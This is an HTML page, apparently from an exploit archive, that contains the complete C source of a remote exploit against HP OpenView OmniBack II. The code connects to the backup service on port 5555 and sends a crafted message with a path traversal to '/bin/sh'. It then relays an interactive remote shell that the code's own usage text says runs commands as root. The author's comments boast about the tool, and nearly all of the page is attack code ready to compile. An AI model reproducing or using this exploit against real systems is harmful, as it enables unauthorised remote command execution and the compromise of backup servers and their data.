<html>
<head>
<title>HP OpenView OmniBack II Generic Remote Exploit</title>
<pre>
/ *
 * HP OpenView OmniBack II generic remote Exploit by DiGiT - teddi@linux.is
 *
 * Omniback is a network backup system by HP, widely used.
 * took me some time to figure out how omniback communicated then it was just
 * a matter of finding a bug.
 *
 * This lovely little exploit will give you a remote &quot;shell&quot; of sorts, you
 * can execute any command on the system.
 *
 * As far as I can tell this thing is vuln on every Omniback I have seen.
 * I've tried HP-UX, Linux so far, with diff versions etc. It needs some change
 * to work on windows, but should very extremly easy, be creative.
 *
 * Greets, #!security.is, #!ADM#$%$#, #hax &amp; HP systems for this proggie ;&gt;
 *
 * - DiGiT [digit@security.is]
 *
 * I'm releasing this because it leaked and kids got their hands on it ;&lt;
 * sorry.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;errno.h&gt;
#include &lt;netdb.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;


int sockfd;
struct hostent *host;

usage (char *progname)
  {

  printf (&quot;\nOmniback II *: remote exploit by DiGiT - teddi@linux.is\n&quot;);
  printf (&quot;Gives possibility to execute any command on a remote system as root!\n\n&quot;);
  printf (&quot;Usage: %s hostname \n\n&quot;, progname);
  exit (1);

}

int
shell()
  {

   fd_set fd_stat;
   char recv[1024];
   int n,i;
   static char testcmd[256] = &quot;/bin/uname -a ; id ;\r\n&quot;;

        fprintf(stdout, &quot;We have remote shell&amp;%#$&amp;%!\n&quot;);
        fprintf(stdout, &quot;\nType in any command and it will get executed.\nHave fun... DiGiT - teddi@linux.is\n\n\n&quot;);
        write(sockfd, testcmd, strlen(testcmd));
     
   while(1)
   {
      FD_ZERO(&amp;fd_stat);
      FD_SET(sockfd, &amp;fd_stat);
      FD_SET(0, &amp;fd_stat);
      select(sockfd+1, &amp;fd_stat, NULL, NULL, NULL);
      if (FD_ISSET(sockfd, &amp;fd_stat))
       {
         if((n=read (sockfd,recv,sizeof(recv))) &lt; 0)
           {
              printf(&quot;Connection has been closed\n&quot;);
              exit(0);
           }
           for(i = 0; i &lt; n ; i++) {
         if(recv[i] == '\000') {
      recv[i] = &quot;&quot;;
    }
           }
             recv[n] = 0;
       recv[n-1] = '\n';
             fprintf(stdout, &quot;%s\n&quot;, recv);
        }
      if (FD_ISSET(0, &amp;fd_stat))
       {
         if((n=read(0, recv, sizeof(recv)))&gt;0)
           {
            if(write(sockfd, recv,n) == -1)
                {
                 printf(&quot;Error %$#\n&quot;);
                 exit(0);
               }
           }
       }
   }
}


send_code ()
  {

  char path[32];

 /* I dont care I just made test code and it worked, so #$%$# off */
 write (sockfd, &quot;\000\000\000.&quot;, 4);
 write(sockfd, &quot;2&quot;, 1);
 write(sockfd, &quot;\000&quot;, 1);
 write(sockfd, &quot; a&quot;, 2);
 write(sockfd, &quot;\000&quot;, 1);
 write(sockfd, &quot; 0&quot;, 2);
 write(sockfd, &quot;\000&quot;, 1);
 write(sockfd, &quot; 0&quot;, 2);
 write(sockfd, &quot;\000&quot;, 1);
 write(sockfd, &quot; 0&quot;, 2);
 write(sockfd, &quot;\000&quot;, 1);
 write(sockfd, &quot; A&quot;, 2);
 write(sockfd, &quot;\000&quot;, 1);
 write(sockfd, &quot; 28&quot;, 3);
 write(sockfd, &quot;\000&quot;, 1);
 snprintf(path, sizeof(path), &quot;/../../../bin/sh&quot;);
 write(sockfd, path, strlen(path));
 write(sockfd, &quot;\000&quot;, 1);
 write(sockfd, &quot;\000&quot;, 1);
 write(sockfd, &quot;digit &quot;, 6);
 write(sockfd, &quot;AAAA\n&quot;, 6); // nada..

 shell(); // and the lord said, let there be shell.
 exit(0);
 
}

create_socket (char *hostname)
  {

  struct sockaddr_in s;
  int ipaddr;

  if ((host = gethostbyname (hostname)) == NULL)
  {
    herror (&quot;gethostbyname&quot;);
    exit (1);
  }

  memcpy (&amp;ipaddr, host-&gt;h_addr, host-&gt;h_length);

  memset (&amp;s, 0, sizeof (struct sockaddr_in));
  s.sin_family = AF_INET;
  s.sin_port = htons (5555);
  s.sin_addr.s_addr = ipaddr;

  if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) &lt; 0)
    {
      perror (&quot;socket&quot;);
      exit (1);
    }

  if ((connect (sockfd, (struct sockaddr *) &amp;s, sizeof (s))) &lt; 0)
    {
      perror (&quot;connect&quot;);
      exit (1);
    }

}

int
main (char argc, char *argv[])
 {

  char hostname[256];

  if (argc &lt; 2)
    {
      usage (argv[0]);
      return 0;
    }

    strncpy(hostname, argv[1], sizeof(hostname));
    create_socket (hostname);
    send_code();

 return 0;

} 

// milw0rm.com [2000-12-21]
</pre>
</html>

